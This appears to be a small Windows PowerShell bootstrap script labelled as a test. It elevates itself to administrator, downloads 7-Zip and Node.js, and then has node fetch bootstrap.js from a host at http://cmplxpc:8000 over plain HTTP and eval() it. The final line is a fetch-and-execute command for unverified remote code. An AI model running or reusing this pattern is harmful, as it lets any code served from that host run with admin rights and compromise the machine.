# test script

$CloudScriptHost = 'http://cmplxpc:8000'

if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
 if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
  $CommandLine = "-Command `"" + $MyInvocation.MyCommand + "`""
  Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList $CommandLine
  Exit
 }
}

$env:CLOUD_SCRIPT_HOST = $CloudScriptHost

$SetupDir = (gi $env:temp).fullname + "\setup-win";

md $SetupDir -ErrorAction SilentlyContinue
cd $SetupDir

#-WindowStyle Hidden
$ProgressPreference = 'SilentlyContinue'
Invoke-WebRequest -Uri "https://7-zip.org/a/7zr.exe" -OutFile 7z.exe
Write-Host "Downloading Script Runner...";
Invoke-WebRequest -Uri "https://nodejs.org/dist/v18.12.1/node-v18.12.1-win-x64.7z" -OutFile node.7z
.\7z.exe e node.7z node-v18.12.1-win-x64/node.exe -y
Remove-Item -Recurse -Force node.7z
Start-Process -FilePath "node.exe" -ArgumentList "-e", "`"require('http').get('$CloudScriptHost/bootstrap.js', r=>{let buffer = [];r.on('data', d => buffer.push(d));r.on('end', () => eval(Buffer.concat(buffer).toString('utf8')));})`""